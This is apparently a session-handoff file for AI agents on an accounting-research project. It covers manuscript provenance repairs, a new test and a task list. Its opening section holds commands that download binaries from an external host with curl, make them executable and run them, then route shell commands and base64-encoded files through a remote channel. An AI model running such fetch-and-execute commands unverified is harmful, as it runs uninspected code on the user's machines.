---
project: wealth-tensor
gh_sha: PENDING
updated: 2026-08-13
session: wealthTensor-21
gate_passed: true
gate_version: "2.50"
---

# wealth-tensor — HANDOFF

*Overwritten every session. `git log -p docs/HANDOFF.md` is the archive. Run
`python3 scripts/handoff_gate.py --check` before trusting this file.*

---

## 0 · TRANSPORT — darlish, zero-bridge

```
curl -s https://system.europeanflorist.com/dsh/darlish-up -o /tmp/darlish-up && chmod +x /tmp/darlish-up && /tmp/darlish-up
```

Post the printed `DARLISH-ENROLL v1 id=… fp=…` line **exactly** as a comment on Asana task
**1217316841710435** via the session's Asana MCP, then run `/tmp/darlish-up` again to collect.
First collect has now worked **-06 through -21 without exception**. `-17` proved the pipe survives
the bridge dropping; `-18` proved it survives the host rebooting. Never restart anything to fix
darlish, and do not re-enrol after a reboot — just call `dx`.

```
curl -s https://system.europeanflorist.com/dsh/dx -o /tmp/dx && chmod +x /tmp/dx
/tmp/dx '~/Scripts/roster join --who big-wealthTensor-22 --task "<what you are doing>"'
/tmp/dx '~/Scripts/roster claim --who big-wealthTensor-22 --resource wealth-tensor'
```

`export LESSONS_CONTRIBUTOR=opus` before any `lessons.py add`. Three leaves banked this session,
two global and one project-scoped.

**Never inline a multi-line string in a `dx '...'` argument.** Write a local file, `--put` it, run
it — used three times this session with no incidents, and it is what makes an apostrophe-heavy
`lessons.py add` survive. `dx --get` fails on binary; base64 both ways, and macOS `base64` wants
`-i`/`-o`, not a positional filename. **`tar czf - *.md | base64` through `dx` moved eighteen
prereg/result docs into the container in one call** — do that rather than eighteen `--get`s.
Quote remote paths. Exit 3 = never reached darwin, safe to re-run; exit 4 = started, check state
first. Use `./.venv/bin/python` — `python3 -m pytest` dies at collection because scipy lives only
in the venv. **309 tests, ~41 s.**

The roster contention warning naming YOU is still noise. Carded on State Machine
`1217420907841952`. Do not spend a turn on it.

---

## THE SIX THINGS THAT HAVE EACH COST A SESSION A RUN — read this first

The first four are one mistake: **reconstructing registered machinery from its signature instead
of copying its call site.** The fifth and sixth are its mirror in prose and in provenance.

1. **`extract_events` defaults to `onset_rule="streak"`, which is PRE-001.** The registered
   PRE-002/REG-003 sample is `onset_rule="peak"`. Call site: `wt089_harvest.py:83` —
   `include_annual_attributed=True, onset_rule="peak", signal="revenue"`. Copy it.
2. **`peak_onset` returns a TUPLE** `(onset, censored)`, so `if … is not None` is always true and
   inflates the risk set. The real logic is `wt089_riskset.eligible_quarters`, fourteen lines.
3. **ALWAYS RUN THE UNCHANGED ARM AS A CONTROL, IN THE SAME PASS.** `-19` promoted this to a
   registered falsifier (REG-007 F8). `-20` found the manuscript violating it. `-21` found it
   violated again one clause away — see §1. **It is now a test, not a rule** (§4).
4. **The committed PANEL is registered machinery too.** `data/reg-006-wt092-panel.json` carries
   `cik`, `sic`, `universe` and per-`fy_end` `t0/t1/t2/G/G_present/A` for 1,602 firms. Re-read it;
   do not rebuild it from `edgar.py`. REG-007 §3.1 forbids the rebuild in writing.
5. **A DANGLING ORDINAL IS RECOVERABLE, NOT UNKNOWABLE — AND THE RECIPE IS ONE COMMAND** (`-20`).
   Positional prose and its referent were correct simultaneously at exactly one revision:
   ```
   git log --oneline -S"<the distinctive sentence>" -- <path>          # the commit that WROTE it
   git show <commit>:<path> | awk '/<section>/,/<end>/' | grep -n '^| \*\*'   # count AS THE AUTHOR SAW
   ```
6. **NEW, `-21` · `git log -S` DATES A NUMBER, AND THAT SETTLES PROVENANCE ARGUMENTS IN ONE CALL.**
   Before believing a figure belongs to the run its sentence claims, ask git when it entered and
   where else it lives:
   ```
   git log --oneline -S"2.34×" -- docs/papers/paper-III-dual-tensor/paper-III.md   # entered at 93a159b
   grep -rn "2.41×" --include=*.md .                                              # lives in ONE file
   ```
   That took one call and turned "this number looks off" into "this number entered in the commit
   that was correcting a published sentence, and its published counterpart has never appeared in
   the manuscript." Use it before carding, arguing, or re-running anything.

### `severity.check`'s witness contract

A **zero-argument callable** returning the SAME PREDICATE evaluated on a world where the claim is
FALSE, which must come back falsy. Returning the raw quantity makes the guard VACUOUS and the run
dies with `PHANTOM TAG`. The falsifying world must be RUNNABLE. Copy
`wt092_sequencing_vs_coupling.py:172`'s call site rather than reconstructing the signature.

### Editing the manuscript

`scripts/patchkit.py`, `apply_edits`, **never `sed`**. Copy anchors out of a `dx --get` copy WITH
THEIR LINE BREAKS and WITH their leading indentation. Anchor on a span with **no internal
newline** where you can; where you cannot (a re-wrapped paragraph), re-emit the whole block.
Re-wrap to 100 columns when a replacement lengthens a line. **Validate anchors and widths in the
container before you `--put`** — a six-line python check caught nothing this session because it
had already caught everything: three anchors, two files, first try, no incidents.

---

## 1 · WHAT HAPPENED — THE AT-BAT'S #2 RAN, AND THE SWEEP IT ORDERED FOUND ONE

Two commits: **e117330** (the cell fix) and **23bdc16** (the guard). **309 tests green, was 286.**
Structure unchanged — 2 `#`, 15 `##`, 29 `###`, 17 `---`; paper III **2,637 lines**; gate **PASS**;
tree clean and pushed.

### §5.4's intangible pair was half published and half re-crawl

`-20` ordered a sweep for other baseline-substitutions and said "there is no reason to think it is
the only one." It was not. The manuscript read:

> it is these two intangible-with-goodwill cells that replicate across both sectors — **5.83× and
> 2.34×**, 3.33× and 2.22×, all four surviving Holm correction.

`RESULT-REG-003` — the published run that sentence is reporting — puts indefinite-lived intangible
× goodwill for computer services at **2.41×** (p 0.0020). **2.34× is REG-006's own value, from the
new crawl, where it is the figure on BOTH arms** — which is exactly why substituting it moved
nothing a reader could see. So the retail half of the pair came from the published run and the
computer-services half came from the repair.

`git log -S"2.34×"` dates its entry to **93a159b — the commit that was replacing a published
sentence REG-006 had just overturned.** `2.41×` has never appeared in the manuscript, and exists in
exactly one place in the repo. The correction that killed one baseline substitution introduced
another, one clause away, in the same paragraph.

**The conclusion is unchanged and better supported.** All four cells survive Holm at the published
p-values (0.0012, 0.0020, 0.0056, 0.0012), and REG-006 §2.1 has all four surviving the repair too
— which the manuscript had never said. §5.4 now prints **2.41×**, and the four cells carry their
repaired arm (5.86× / 2.34×, 3.35× / 2.22×) against the same crawl unrepaired (5.83× / 2.34×,
3.34× / 2.21×). The intangible claim is now controlled the way the property and headline claims
already were — it was the only quantity in that paragraph without its repaired arm, while being
the one the paper leans on.

### The process finding is better than the defect

REG-006 §4 ("every constant read, not recomputed") enumerated the eight constants the run **read
out of** `RESULT-REG-003` and F6 verified every one. It passed, correctly. The run then **wrote**
a sentence into the manuscript carrying two constants that were never on that list. **The read
list was complete and the write list did not exist.** Recorded as a dated correction in
`RESULT-REG-006.md` §4 and banked globally. Count the inputs you guarded, count the outputs you
guarded, and be suspicious of any ratio with a zero in it.

---

## 2 · THE SWEEP — WHAT IT COVERED, SO -22 DOES NOT REDO IT

Three passes, deliberately different in shape (the `grep-the-concept-then-re-grep-differently`
leaf). **This item is CLOSED.**

| pass | what it looked at | result |
|---|---|---|
| comparison pairs | every `X against/→/rather than/instead of Y` in the manuscript, both halves located in the prereg corpus | 16 pairs; one defect (above) |
| every multiplier | all 23 `N.NN×` tokens in the paper vs all 18 prereg/result docs | isolated L1397 as the only line mixing a REG-003-only and a REG-006-only token |
| empirical counts | all 127 numeric tokens in §5, §9's limitation 9 and the abstract | clean — the one apparent orphan, α̂ sensitivity `0.413`, is `0.4129` rounded (REG-003 §2, one-event-per-firm) |

**Refuted, and worth not re-opening:** §4.5 pairs a lag figure from a **400**-ladder draw against a
magnitude figure the §7 ledger attributes to a **4,000**-ladder draw. That is Monte-Carlo precision
on one population, not two data sources — REG-002 E1/E7 own both, and the paper already carries the
qualification ("part of that margin belongs to the ladder"). **Not the same defect. Leave it.**

Also checked by hand and consistent: every §7 falsifier row's numbers against the §4 body
(1.22/2.00/1.00, 1.24/6.8, −0.39/+0.16, −1.07/−0.38, −0.78/−0.09, 0.0079, 1.30×), and §9's
limitation 9 (4.12×/2.02×) against the §5.4 table.

---

## 3 · WHAT `-21` DID NOT TOUCH

REG-007's Λ result, the placebo, the phrase set, the keyword families, the 0.436/0.403 pair, §4.4's
table, the ladders — all untouched. **Nothing this session re-ran an instrument;** every change is
a provenance repair backed by numbers already committed, plus one new offline test. That is why
309 tests were enough.

---

## 4 · NEW MACHINERY — `tests/test_cell_provenance.py` (23 tests, offline)

The defect class has now been caught **twice, both times by a human re-reading two result docs
against one paragraph.** That does not survive a handoff, so it is a test now.

- **Guard 1** — no multiplier may appear in §5.4 without a declared owning run in `CELLS`.
  *Adding a number to §5.4 means declaring where it came from.* That is the step REG-006 §4 skipped.
- **Guard 2** — every declared value must be **reported by a TABLE** in that run. This is the one
  that goes red on the historical defect: proven against the pre-fix manuscript at `b4d5bc4`,
  where 2.34× sat in the published pair and no `RESULT-REG-003` table reports it.
- **A witness test** proves the two runs actually disagree on that cell, so the guard is not vacuous.

**The witness failed on its own first run, and the failure was the design talking.** `-21`'s
correction note in `RESULT-REG-006` §4 *quotes* the published 2.41× while explaining why
substituting it was wrong — so a whole-file grep read that quotation as REG-006 *reporting* the
value. **Documenting the defect had made the defect undetectable.** Fixed by scoping both sides to
table rows: prose about a number is not a run reporting it. Same `empty`-vs-`absent` family this
project has now paid for four times; second one to ship a test rather than a paragraph.

**Honest limitation, stated in the docstring:** it cannot tell you a correctly-sourced number is
sitting in the wrong SLOT in a sentence. It removes the silent case, not the reading.

---

## 5 · RULINGS — DO NOT REOPEN

- **The two retail PP&E × intangible cells STAY OUT of §5.4.** Ruled `-20`, recorded in
  `RESULT-REG-006` §2.2. Couplings the repair *discovered*, not published claims it *revised*.
  Reopening needs a registration, not a ruling.
- **§4.4's table is SETTLED.** Ruled `-18` after a two-round conversation. Both the α̂ = 0.408
  column and the "the calibration" label; neither move survives alone.
- **The `## References` provenance block STAYS AS IT IS.** Ruled `-16`.
- **§4.5's 400-vs-4,000 pairing is not a defect.** Ruled `-21`, §2 above.
- Jason's standing test, stated `-18`: *"will the econometrician be able to follow the line of
  thought?"* Reader before referee.

---

## 6 · THE AT-BAT, RANKED

1. **THE NEXT DISCLOSURE INSTRUMENT IS A PARSING PROBLEM, NOT A LEXICON PROBLEM.** Do not answer
   REG-007's null with a bigger keyword list: the registered families reach 0.436 in the mandated
   window and 0.403 in the placebo, and adding keywords moves both. What separates them exists only
   in event-specific narrative — the named reporting unit, the dated trigger, the charge amount tied
   to the sentence. **Sentence-level parsing keyed on the reporting-unit name. New registration.**
   Fold in the two dead keywords and the corrected "composition or carrying amount of its net
   assets" wording while you are there; both are registered territory, not patches.
   `data/reg-007-passages.json.gz` **IS COMMITTED** (3.7 MB, 1,925 firm-years, 9,852 passages) —
   read it instead of re-crawling. The harvest was ~7 minutes for ~2,600 SEC requests at 6 workers;
   there is no reason to pay that twice. **This is now unambiguously the top item** — the sweep that
   outranked it last session is closed.
2. **THE σ-AND-LIFETIME RESULT STILL NEEDS NEW DATA.** Realised return volatility and disclosed
   useful lives are not in this sample. Do not proxy — **WT-038, a three-time payer.**
3. **Cheap and mechanical, if you want a warm-up: extend the provenance guard one level up.** §7's
   falsifier ledger restates ~15 numbers from the §4 body. `-21` checked them by hand and they are
   consistent; nothing checks them mechanically. The `CELLS` pattern generalises directly — a table
   of `(ledger row, body line, value)` and the same two assertions. Half an hour, and it retires
   another by-hand read. **Do not do this instead of item 1.**
4. **Cready et al. (2012) full text, if the prior-art question is reopened.** `-20` cleared the two
   `-19` leads by title/abstract only: Cready, Lopez & Sisneros (2012) *"Negative Special Items and
   Future Earnings"* and Hirschey & Richardson (2002) *"Information Content of Accounting Goodwill
   Numbers"* — neither carries test-sequencing content. Recorded as "not found by keyword search",
   not "does not exist"; Scholar/SSRN remain blocked. Cready's "expense transfer" framing is the
   best lead in the file. The gap still looks real.

---

## 7 · DO NOT

- **DO NOT WIDEN `CELLS` IN `test_cell_provenance.py` TO SILENCE A FAILURE.** Resolve the number
  against `RESULT-REG-003` or `RESULT-REG-006` first. A guard edited to agree with the thing it
  guards is worse than no guard, because it reads as verification.
- **ASK A SUBAGENT FOR ITS UNVERIFIED LIST EXPLICITLY.** Best output of both `-19` subagents was
  refutation: AZG&S does not flag the sequencing gap; the "not all-inclusive" language is
  350-20-35-3F, not 35-3C; 350-20-35-31 is a four-sentence paragraph whose parenthetical sits in the
  second; and **IAS 36 ¶104 and ASC 350-20-35-31 RUN IN OPPOSITE DIRECTIONS** — ¶104 is a
  loss-allocation waterfall hitting goodwill first, 35-31 is a test-ordering rule writing other
  assets down *before* the goodwill test. Never cite one for the other. FASB's own server returns
  403 to everything; all Codification text is practitioner reproduction, and that limit lives in
  `RESULT-REG-007` §3 F9/F10 and must stay there.
- **Any paragraph number taken from the SEC Financial Reporting Manual is presumptively stale.**
  Topic 9 still reads "Last updated: December 31, 2009". §9510.2 cites S-K 303(a)(3)(ii), which has
  had no referent since Release 33-10890 (Nov 2020); the live citation is **17 CFR
  229.303(b)(2)(ii)**, liquidity twin (b)(1)(i). F11 closed `-20`. Nothing printed depends on it.
- Do not read §5.4 as a rescue of PRE-001. REG-003 §7 ruled it out in writing before the number
  existed; nothing in REG-004/005/006/007 touches it.
- Do not restore "PRE-001 was doomed by the φδ confound" — false; wt082, wt083, wt088 E7.
- Do not remove the Bateman, Nerlove or Beaver & Ryan concessions. Do not restore "global rather
  than local" to Kuan, the unordered-pair statement to Bellman & Åström, or the bias/lag DESIGN to
  Ryan (1995). Do not reopen Griliches (1967) — closed with evidence.
- **DO NOT POLISH §4.9, §4.10 or §5.4.** §5.4 has now been amended three times, each under a
  registered or corrective warrant with a number behind it (`-19` REG-007 repairs, `-20` control
  repair, `-21` provenance repair). A fourth pass without one is polish — **and the test in §4 now
  makes the numbers self-checking, so "I re-read §5.4 and it looks right" is no longer a
  contribution.**
- Do not edit `TIER_TAGS`. PRE-001's constants are a contract; `test_edgar.py` and
  `test_tag_resolution.py` guard them. Corrections live in `TIER_TAGS_REG006`.
- Do not widen REG-007's phrase set or keyword families. Frozen in REG-007 §3.2/§3.3; running them
  as registered — dead keywords and all — is what makes the audit worth anything.
- Do not quote a single "recognition rate" or "effective recognition rate" — §4.10 shows the name
  covers three quantities 15% apart at a three-year life; α_eff is a function of δ.
- Do not report a δ-rectangle share from REG-004 or REG-005 — both complements are empty and both
  were withheld deliberately, in advance.
- Do not read ladders A/R/A3's failure, or REG-007's null, as evidence about the world. F4b showed
  the estimator loses half the signal in a world built to contain it; REG-007's placebo shows its
  classifier reads boilerplate. **A null from an instrument that registered or measured its own
  blindness is a finding about the instrument.**
- Do not hand Jason a ranked list of problems as the deliverable. Do not run a pure-teardown pass.
- Do not invoke Mayo or error-statistical philosophy as a warrant. Pragmatic justification.
- Do not ask him to submit anything. Never add a free parameter to absorb an objection.
- Do not rewrite or summarise the charter inside a handoff.
- Adding a section means DELETING conduct narration elsewhere, not refreshing `.coach-baseline.json`.
- `gate-selfcheck` is **PASS**. If it fails for you it is new. (The handoff-lint warnings it prints
  are on `HANDOFF-floristAlix-2.md`, a different project — not ours, not a blocker.)

---

## 8 · STUDENT-IN — run it, it keeps paying

```
python3 ~/repos/claude-blackbook/lessons.py doctrine
python3 ~/repos/claude-blackbook/lessons.py search "<the task>" --scope global,wealth-tensor
```

`-17` and `-18` skipped this; `-19`, `-20` and `-21` ran it. `-21`'s sweep was shaped by the
`grep the CONCEPT, then re-grep with a DIFFERENT pattern before declaring the sweep done` leaf —
which is why the sweep ran three differently-shaped passes instead of one, and why §2 above can
say what it *cleared* rather than only what it found. Corroborate what you use:
`lessons.py use <id> --task <tag>` at student-in, `lessons.py record-outcome <tag> pass` at wrap.

Three leaves banked this session — two global (**a guard scoped to what a run CONSUMED does not
cover what it EMITS**; **a provenance check must read the surface where a source REPORTS, not the
whole document**) and one project-scoped (§5.4's two-run cell map and the test that pins it).
